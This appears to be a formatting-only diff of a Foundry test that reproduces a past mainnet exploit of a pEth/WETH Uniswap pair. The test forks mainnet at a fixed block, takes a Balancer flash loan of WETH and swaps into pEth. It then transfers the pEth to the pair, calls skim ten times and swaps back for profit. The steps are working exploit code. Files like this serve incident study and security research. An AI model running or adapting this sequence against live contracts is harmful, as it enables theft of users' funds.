@@ -10,7 +10,6 @@ import "./interface.sol";
 // Vulnerable Contract : https://etherscan.io/address/0x2033b54b6789a963a02bfcbd40a46816770f1161
 // Attack Tx : https://etherscan.io/tx/0x4ab68b21799828a57ea99c1288036889b39bf85785240576e697ebff524b3930
 
-
 // @Analysis
 // Post-mortem : https://www.google.com/
 // Twitter Guy : https://twitter.com/CertiKAlert/status/1710979615164944729
@@ -22,8 +21,7 @@ contract ContractTest is Test {
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     IUniswapV2Pair UNIPair = IUniswapV2Pair(0x2033B54B6789a963A02BfCbd40A46816770f1161);
-    uint amount = 51_970_861_731_879_316_502_999;
-
+    uint256 amount = 51_970_861_731_879_316_502_999;
 
     function setUp() public {
         vm.createSelectFork("mainnet", 18_305_132 - 1);
@@ -35,16 +33,16 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        uint startWETH = WETH.balanceOf(address(this));
+        uint256 startWETH = WETH.balanceOf(address(this));
         console.log("Before Start: %d WETH", startWETH);
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
-        uint[] memory amounts = new uint[](1);
+        uint256[] memory amounts = new uint[](1);
         amounts[0] = amount;
         Balancer.flashLoan(address(this), tokens, amounts, "");
 
-        uint intRes =  WETH.balanceOf(address(this))/1 ether;
-        uint decRes =  WETH.balanceOf(address(this)) - intRes * 1e18;
+        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;
+        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;
         console.log("Attack Exploit: %s.%s WETH", intRes, decRes);
     }
 
@@ -57,18 +55,20 @@ contract ContractTest is Test {
         address[] memory path = new address [](2);
         (path[0], path[1]) = (address(WETH), address(pEth));
         UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amounts[0], 0, path, address(this), type(uint).max);
-        uint pEth_amount = pEth.balanceOf(address(this));
+            amounts[0], 0, path, address(this), type(uint256).max
+        );
+        uint256 pEth_amount = pEth.balanceOf(address(this));
         pEth.transfer(address(UNIPair), pEth_amount);
 
-        for(uint i=0; i<10; i++){
+        for (uint256 i = 0; i < 10; i++) {
             UNIPair.skim(address(UNIPair));
         }
 
         (path[0], path[1]) = (address(pEth), address(WETH));
         pEth_amount = pEth.balanceOf(address(this));
         UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            pEth_amount, 0, path, address(this), type(uint).max);
+            pEth_amount, 0, path, address(this), type(uint256).max
+        );
 
         WETH.transfer(address(Balancer), amount);
     }
